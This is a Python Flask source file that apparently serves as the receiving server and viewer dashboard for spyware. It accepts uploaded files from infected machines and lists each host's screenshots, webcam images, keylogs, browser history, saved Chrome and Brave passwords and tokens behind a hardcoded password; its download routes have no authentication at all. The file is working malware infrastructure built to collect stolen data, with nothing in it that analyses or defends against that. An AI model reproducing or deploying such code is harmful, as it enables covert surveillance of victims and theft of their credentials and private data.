import os
from flask import Flask, request, send_from_directory, render_template_string, send_file
from werkzeug.utils import secure_filename
from datetime import datetime
import pytz

UPLOAD_ROOT = "logs"
PASSWORD = "disha456"

app = Flask(__name__)
os.makedirs(UPLOAD_ROOT, exist_ok=True)

COLUMNS = [
    "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
    "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
]

TEXT_VIEW_COLUMNS = ["keylogs", "decoded_keylogs"]  # files to display as plain text

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <title>System Log Monitor</title>
  <style>
    body { background-color: black; color: lime; font-family: monospace; }
    h2 { color: cyan; }
    table { border-collapse: collapse; width: 100%; margin-top: 20px; }
    th, td { border: 1px solid lime; padding: 8px; text-align: center; }
    th { font-size: 18px; font-weight: bold; background: #222; }
    td a { color: cyan; text-decoration: none; }
    form { margin-top: 30px; }
    input[type=password] { background: black; color: lime; border: 1px solid lime; padding: 5px; }
  </style>
</head>
<body>
  {% if not authed %}
    <h2>Enter Password to Access Logs</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="Enter password"/>
      <button type="submit">Login</button>
    </form>
  {% else %}
    <center><h2>Log Viewer (Live Feed)</h2></center>
    <table>
      <tr>
        {% for col in columns %}
          <th>{{ col }}</th>
        {% endfor %}
      </tr>
      {% for folder in logs %}
        <tr>
          <td>{{ folder.hostname }}</td>
          <td>{{ folder.timestamp }}</td>
          {% for file, is_text in folder.files %}
            <td>{% if file %}<a href="{{ file }}" {% if is_text %}target="_blank"{% endif %}>📥 View/Download</a>{% else %}-{% endif %}</td>
          {% endfor %}
        </tr>
      {% endfor %}
    </table>
  {% endif %}
</body>
</html>
'''

@app.route("/", methods=["GET", "POST"])
def index():
    authed = False
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            authed = True
    elif request.args.get("access") == PASSWORD:
        authed = True

    log_entries = []
    if authed:
        for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
            full_path = os.path.join(UPLOAD_ROOT, folder)
            if os.path.isdir(full_path):
                try:
                    dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
                    utc = pytz.utc.localize(dt)
                    ist = utc.astimezone(pytz.timezone("Asia/Kolkata"))
                    formatted_timestamp = ist.strftime("%H:%M:%S__%d:%m:%Y")
                except:
                    formatted_timestamp = folder

                row = {"hostname": "", "timestamp": formatted_timestamp, "files": []}

                for col in COLUMNS[2:]:
                    matched = False
                    for f in os.listdir(full_path):
                        normalized = col.lower().replace(" ", "_")
                        alternatives = {
                            "chrome_history": ["chrome_history", "browser_history"],
                            "desktop_screenshot": ["desktop_screenshot", "screenshot"],
                            "keylogs": ["keylogs", "keylogs_export"],
                            "decoded_keylogs": ["decoded_keylogs"]
                        }
                        patterns = alternatives.get(normalized, [normalized])
                        if any(p in f.lower() for p in patterns):
                            is_text_file = normalized in TEXT_VIEW_COLUMNS
                            url = f"/view/{folder}/{f}" if is_text_file else f"/download/{folder}/{f}"
                            row["files"].append((url, is_text_file))
                            matched = True
                            break
                    if not matched:
                        row["files"].append((None, False))

                activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
                if activity_log_file:
                    try:
                        with open(os.path.join(full_path, activity_log_file), "r", encoding="utf-8") as f:
                            for line in f:
                                if "Computer Name:" in line:
                                    row["hostname"] = line.split(":", 1)[1].strip()
                                    break
                    except:
                        row["hostname"] = "Unknown"

                if not row["hostname"]:
                    row["hostname"] = folder.split("_")[0]

                log_entries.append(row)

    return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)

@app.route("/api/receive", methods=["POST"])
def receive():
    folder_name = datetime.utcnow().strftime("%Y-%m-%d_%H-%M-%S")
    save_dir = os.path.join(UPLOAD_ROOT, folder_name)
    os.makedirs(save_dir, exist_ok=True)
    for f in request.files.values():
        filename = secure_filename(f.filename)
        f.save(os.path.join(save_dir, filename))
    return "Logs received"

@app.route("/download/<folder>/<filename>")
def download(folder, filename):
    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename, as_attachment=True)

@app.route("/view/<folder>/<filename>")
def view_text(folder, filename):
    try:
        filepath = os.path.join(UPLOAD_ROOT, folder, filename)
        return send_file(filepath, mimetype='text/plain')
    except:
        return "Failed to load file", 404

if __name__ == "__main__":
    app.run(debug=True)
